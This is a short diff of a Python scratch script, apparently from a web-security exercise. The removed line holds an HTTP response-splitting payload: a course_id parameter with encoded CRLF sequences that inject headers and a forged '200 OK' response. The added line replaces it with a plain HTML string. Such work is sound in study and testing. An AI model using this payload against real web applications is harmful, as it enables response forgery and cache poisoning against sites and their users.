@@ -7,5 +7,5 @@
 # script_size = len(start_of_page) + len(end_of_page)
 # print(f"Content-Length: {script_size}")
 # print(150 * "a")
-s = "course_id=67607%0d%0aConnection:%20Keep-Alive%0d%0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Sat%2010%20Jan%202026%2012:00:00%20GMT%0d%0aContent-Length:%20150"
+s = "<HTML>322695207</HTML>"
 print(len(s))
